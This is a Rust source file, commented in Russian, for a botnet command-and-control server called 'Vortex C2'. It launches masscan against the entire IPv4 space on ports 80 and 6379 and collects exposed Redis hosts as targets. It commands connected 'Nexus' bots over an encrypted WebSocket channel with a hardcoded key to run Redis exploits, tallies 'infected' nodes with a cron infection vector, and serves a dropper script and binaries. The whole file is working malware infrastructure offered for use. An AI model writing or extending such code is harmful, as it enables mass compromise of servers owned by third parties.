use axum::{routing::get, Router};
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use std::process::Stdio;
use tokio::time::{sleep, Duration, Instant}; // Добавляем Instant
use serde::{Deserialize, Serialize};
use serde_json;
use tokio::sync::watch;
use std::sync::{Arc, Mutex}; // Добавляем Arc и Mutex
use axum::extract::ws::{WebSocketUpgrade, WebSocket}; // Используем встроенные в axum типы для WebSocket
use axum::extract::State; // Добавляем State
use aes_gcm::{Aes256Gcm, Key, Nonce}; // Для AES-256-GCM
use aes_gcm::aead::{Aead, KeyInit, OsRng}; // Для AES-256-GCM
use rand_core::RngCore; // Для генерации nonce
use tokio::signal; // Добавляем для обработки сигнала Ctrl+C
use tokio::sync::mpsc; // Добавляем mpsc
use std::collections::HashMap; // Добавляем HashMap
use uuid::Uuid; // Добавляем Uuid
use futures_util::stream::StreamExt; // Добавляем StreamExt
use futures_util::sink::SinkExt; // Добавляем SinkExt
use tower_http::services::ServeDir; // Добавляем ServeDir для отдачи статических файлов

mod tui; // Добавляем импорт модуля tui

// Временный ключ для демонстрации. В реальном приложении должен быть безопасный механизм управления ключами.
const KEY: &[u8; 32] = b"a_very_secret_key_for_aes256gcm!";

#[derive(Debug, Deserialize, Serialize)]
struct PortInfo {
    port: u16,
    proto: String,
    status: String,
    reason: String,
    ttl: u8,
}

#[derive(Debug, Deserialize, Serialize)]
struct MasscanResult {
    ip: String,
    timestamp: String,
    ports: Vec<PortInfo>,
}

#[derive(Debug, Clone)]
pub struct NodeInfo {
    pub ip: String,
    pub hostname: String,
    pub cpu_load: f32,
    pub latency: u16,
    pub infection_vector: Option<String>, // Добавляем поле для вектора заражения
}

#[derive(Debug, Clone)]
pub struct GlobalStats {
    pub pps: u64,
    pub total_nodes_infected: u64,
    pub scan_throughput: u64, // В байтах/сек или аналогично
    // Добавляем поля для расчета PPS
    pub last_update_time: Instant,
    pub parsed_results_in_interval: u64,
    pub nodes: Vec<NodeInfo>, // Добавляем список обнаруженных узлов
    pub successful_exploits: u64, // Добавляем счетчик успешных эксплойтов
    pub redis_targets: Vec<String>, // Добавляем список IP с открытым Redis
}

// Команды, которые C2 может отправлять Nexus-пропагаторам
#[derive(Debug, Serialize, Deserialize)]
pub enum BotCommand {
    Hello { c2_id: String }, // Добавляем команду Hello от C2
    ExploitRedis { target_ip: String },
    // Другие команды могут быть добавлены здесь
}

// Отчеты, которые Nexus-пропагаторы отправляют обратно в C2
#[derive(Debug, Serialize, Deserialize)]
pub enum Report {
    Hello { client_id: String },
    ExploitResult { target_ip: String, success: bool, message: String },
    // Другие типы отчетов
}

// Тип для хранения активных WebSocket-соединений к Nexus-ботам
pub type ActiveNexusBots = Arc<Mutex<HashMap<String, mpsc::Sender<axum::extract::ws::Message>>>>;

// Единая структура состояния для Axum-приложения
pub struct AppState {
    pub global_stats: Arc<Mutex<GlobalStats>>,
    pub active_bots: ActiveNexusBots,
}

async fn masscan_manager(stats_sender: watch::Sender<GlobalStats>) {
    let current_stats = Arc::new(Mutex::new(GlobalStats {
        pps: 0,
        total_nodes_infected: 0,
        scan_throughput: 0,
        last_update_time: Instant::now(),
        parsed_results_in_interval: 0,
        nodes: Vec::new(), // Инициализируем пустой вектор узлов
        successful_exploits: 0,
        redis_targets: Vec::new(),
    }));

    loop {
        println!("Starting masscan subprocess...");
        let mut command = Command::new("masscan");
        command
            .arg("0.0.0.0/0") // Теперь сканируем весь IPv4
            .arg("--exclude")
            .arg("255.255.255.255") // Добавляем исключение для широкого диапазона
            .arg("-p80,6379") // Теперь сканируем порты 80 и 6379
            .arg("--rate")
            .arg("1000")
            .arg("--output-format")
            .arg("json")
            .arg("--output-filename")
            .arg("-") // Output to stdout
            .stdout(Stdio::piped())
            .stderr(Stdio::piped()); // Capture stderr as well for debugging

        let mut child = match command.spawn() {
            Ok(child) => child,
            Err(e) => {
                eprintln!("Failed to spawn masscan: {}", e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        let stdout = child.stdout.take().expect("Failed to capture masscan stdout");
        let stderr = child.stderr.take().expect("Failed to capture masscan stderr");

        let mut stdout_reader = BufReader::new(stdout).lines();
        let mut stderr_reader = BufReader::new(stderr).lines();

        let stats_sender_clone = stats_sender.clone();
        let current_stats_clone = Arc::clone(&current_stats);

        // Spawn tasks to read stdout and stderr concurrently
        let stdout_task = tokio::spawn(async move {
            while let Some(line) = stdout_reader.next_line().await.expect("Failed to read stdout") {
                if line.trim().is_empty() {
                    continue;
                }
                match serde_json::from_str::<MasscanResult>(&line) {
                    Ok(result) => {
                        println!("[masscan result]: {:?}", result);
                        let mut stats = current_stats_clone.lock().unwrap();
                        stats.total_nodes_infected += 1;
                        stats.parsed_results_in_interval += 1;

                        let mut is_redis_target = false;
                        for port_info in &result.ports {
                            if port_info.port == 6379 {
                                is_redis_target = true;
                                break;
                            }
                        }

                        if is_redis_target {
                            if !stats.redis_targets.contains(&result.ip) {
                                stats.redis_targets.push(result.ip.clone());
                                println!("Found new Redis target: {}", result.ip);
                            }
                        }

                        // Добавляем новый узел в список
                        stats.nodes.push(NodeInfo {
                            ip: result.ip,
                            hostname: "unknown".to_string(), // Заглушка
                            cpu_load: 0.0,                   // Заглушка
                            latency: 0,                      // Заглушка
                            infection_vector: None,          // Инициализируем None
                        });

                        let elapsed = stats.last_update_time.elapsed();
                        if elapsed >= Duration::from_secs(1) {
                            stats.pps = stats.parsed_results_in_interval / elapsed.as_secs();
                            stats.scan_throughput = stats.pps; // Пока приравниваем к PPS
                            stats.parsed_results_in_interval = 0;
                            stats.last_update_time = Instant::now();
                        }
                        stats_sender_clone.send(stats.clone()).unwrap();
                    },
                    Err(e) => eprintln!("[masscan stdout parse error]: {} for line: {}", e, line),
                }
            }
        });

        let stderr_task = tokio::spawn(async move {
            while let Some(line) = stderr_reader.next_line().await.expect("Failed to read stderr") {
                eprintln!("[masscan stderr]: {}", line);
            }
        });

        let status = child.wait().await.expect("masscan process encountered an error");
        println!("masscan process exited with status: {:?}", status);

        // Wait for stdout/stderr tasks to finish reading
        let _ = tokio::join!(stdout_task, stderr_task);

        sleep(Duration::from_secs(5)).await; // Wait before restarting masscan
    }
}

// Функция для шифрования сообщения
fn encrypt_message(plaintext: &[u8]) -> Result<Vec<u8>, String> {
    let key = Key::<Aes256Gcm>::from_slice(KEY);
    let cipher = Aes256Gcm::new(key);
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    cipher.encrypt(nonce, plaintext)
        .map(|mut ciphertext| {
            let mut result = Vec::with_capacity(nonce_bytes.len() + ciphertext.len());
            result.extend_from_slice(&nonce_bytes);
            result.append(&mut ciphertext);
            result
        })
        .map_err(|e| format!("Encryption error: {:?}", e))
}

// Функция для дешифрования сообщения
fn decrypt_message(ciphertext_with_nonce: &[u8]) -> Result<Vec<u8>, String> {
    if ciphertext_with_nonce.len() < 12 {
        return Err("Ciphertext too short to contain nonce".to_string());
    }
    let nonce = Nonce::from_slice(&ciphertext_with_nonce[..12]);
    let ciphertext = &ciphertext_with_nonce[12..];

    let key = Key::<Aes256Gcm>::from_slice(KEY);
    let cipher = Aes256Gcm::new(key);

    cipher.decrypt(nonce, ciphertext)
        .map_err(|e| format!("Decryption error: {:?}", e))
}

// Обработчик WebSocket-соединений
async fn ws_handler(
    ws: WebSocketUpgrade,
    State(app_state): State<Arc<AppState>>,
) -> axum::response::Response {
    ws.on_upgrade(|socket| handle_socket(socket, app_state))
}

async fn handle_socket(
    socket: WebSocket,
    app_state: Arc<AppState>,
) {
    let client_id = Uuid::new_v4().to_string();
    println!("WebSocket connection established! Temporary client_id: {}", client_id);

    let (mut sender, mut receiver) = socket.split();
    let (tx, mut rx) = mpsc::channel::<axum::extract::ws::Message>(100); // Channel for sending messages to this bot

    // Store the sender in the active bots map
    app_state.active_bots.lock().unwrap().insert(client_id.clone(), tx.clone());

    let client_id_for_send_task = client_id.clone();
    // Task to send messages from mpsc channel to WebSocket
    let mut send_task = tokio::spawn(async move {
        while let Some(message) = rx.recv().await {
            if let Err(e) = sender.send(message).await {
                eprintln!("Error sending message to WebSocket for client {}: {}", client_id_for_send_task, e);
                break;
            }
        }
    });

    // Send initial "Hello" from C2 to Nexus
    let initial_hello_command = BotCommand::Hello { c2_id: "VortexC2".to_string() }; // Assuming C2 has an ID
    let serialized_command = serde_json::to_vec(&initial_hello_command).expect("Failed to serialize command");
    let encrypted_command = encrypt_message(&serialized_command).expect("Failed to encrypt command");
    if let Err(e) = tx.send(axum::extract::ws::Message::Binary(encrypted_command)).await {
        eprintln!("Error sending initial hello command to client {}: {}", client_id, e);
    }

    let client_id_for_recv_task = client_id.clone();
    let app_state_for_recv_task = app_state.clone();
    // Existing loop to receive messages from WebSocket
    let mut recv_task = tokio::spawn(async move {
        let mut current_client_id = client_id_for_recv_task.clone(); // Mutable copy for updating
        while let Some(msg) = receiver.next().await {
            match msg {
                Ok(axum::extract::ws::Message::Binary(bytes)) => {
                    match decrypt_message(&bytes) {
                        Ok(decrypted) => {
                            match serde_json::from_slice::<Report>(&decrypted) {
                                Ok(report) => {
                                    println!("Received report from {}: {:?}", current_client_id, report);
                                    let mut global_stats = app_state_for_recv_task.global_stats.lock().unwrap();
                                    match report {
                                        Report::Hello { client_id: nexus_client_id } => {
                                            println!("Nexus client {} connected. Updating client_id from {} to {}", nexus_client_id, current_client_id, nexus_client_id);
                                            // Update client_id in active_bots_state
                                            let mut active_bots = app_state_for_recv_task.active_bots.lock().unwrap();
                                            if let Some(sender_channel) = active_bots.remove(&current_client_id) {
                                                active_bots.insert(nexus_client_id.clone(), sender_channel);
                                            }
                                            current_client_id = nexus_client_id; // Update for future logs
                                        },
                                        Report::ExploitResult { target_ip, success, message } => {
                                            println!("Exploit result for {}: Success={}, Message={}", target_ip, success, message);
                                            if success {
                                                global_stats.successful_exploits += 1;
                                                if let Some(node) = global_stats.nodes.iter_mut().find(|n| n.ip == target_ip) {
                                                    node.infection_vector = Some("Cron".to_string());
                                                }
                                            }
                                        },
                                    }
                                },
                                Err(e) => {
                                    eprintln!("Failed to deserialize report: {}. Decrypted text: {:?}", e, String::from_utf8_lossy(&decrypted));
                                }
                            }
                        },
                        Err(e) => eprintln!("Decryption failed: {}", e),
                    }
                },
                Ok(axum::extract::ws::Message::Text(text)) => {
                    println!("Received unencrypted text message from {}: {}", current_client_id, text);
                },
                Ok(axum::extract::ws::Message::Ping(pong)) => {
                    if let Err(e) = tx.send(axum::extract::ws::Message::Pong(pong)).await {
                        eprintln!("Error sending pong to client {}: {}", current_client_id, e);
                    }
                },
                Ok(axum::extract::ws::Message::Close(c) ) => {
                    println!("WebSocket connection from {} closed with: {:?}", current_client_id, c);
                    break;
                },
                Err(e) => {
                    eprintln!("WebSocket error for client {}: {}", current_client_id, e);
                    break;
                }
                _ => {
                    eprintln!("Received other WebSocket message type from {}.", current_client_id);
                }
            }
        }
    });

    // If either task finishes, abort the other and remove the client
    tokio::select! {
        _ = (&mut send_task) => {},
        _ = (&mut recv_task) => {},
    }

    // Remove client from active_bots_state
    app_state.active_bots.lock().unwrap().remove(&client_id); // Use initial client_id for removal
    println!("Client {} removed from active bots.", client_id);
}


#[tokio::main]
async fn main() {
    let initial_stats = GlobalStats {
        pps: 0,
        total_nodes_infected: 0,
        scan_throughput: 0,
        last_update_time: Instant::now(),
        parsed_results_in_interval: 0,
        nodes: Vec::new(),
        successful_exploits: 0, // Инициализируем
        redis_targets: Vec::new(), // Инициализируем
    };
    let (stats_sender, stats_receiver) = watch::channel(initial_stats);

    // Общее состояние для Axum-приложения
    let global_stats_arc = Arc::new(Mutex::new(GlobalStats {
        pps: 0,
        total_nodes_infected: 0,
        scan_throughput: 0,
        last_update_time: Instant::now(),
        parsed_results_in_interval: 0,
        nodes: Vec::new(),
        successful_exploits: 0, // Инициализируем
        redis_targets: Vec::new(), // Инициализируем
    }));

    // Состояние для активных Nexus-ботов
    let active_nexus_bots_arc: ActiveNexusBots = Arc::new(Mutex::new(HashMap::new()));

    // Создаем единое состояние приложения
    let app_state = Arc::new(AppState {
        global_stats: global_stats_arc.clone(),
        active_bots: active_nexus_bots_arc.clone(),
    });

    // Spawn the masscan manager task
    tokio::spawn(masscan_manager(stats_sender.clone()));

    // Spawn the TUI task
    tokio::spawn(async move {
        if let Err(e) = tui::run_tui(stats_receiver).await {
            eprintln!("TUI error: {:?}", e);
        }
    });

    // build our application with a single route and WebSocket route
    let app = Router::new()
        .route("/", get(|| async { "Hello, Vortex C2!" }))
        .route("/ws", get(ws_handler))
        .nest_service("/shadow_dropper.sh", ServeDir::new("static/shadow_dropper.sh")) // Отдача скрипта
        .nest_service("/binaries", ServeDir::new("static/binaries")) // Отдача бинарников
        .with_state(app_state); // Передаем единое состояние

    // run it with hyper on localhost:3000
    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000") // Изменено на 0.0.0.0
        .await
        .unwrap();
    let server = axum::serve(listener, app);

    // Запускаем сервер в фоновой задаче
    tokio::spawn(async move {
        if let Err(e) = server.await {
            eprintln!("Axum server error: {}", e);
        }
        println!("Axum server stopped.");
    });

    // Ждем сигнала Ctrl+C, чтобы приложение не завершалось
    signal::ctrl_c().await.unwrap();
    println!("Ctrl+C received, Vortex C2 shutting down.");
}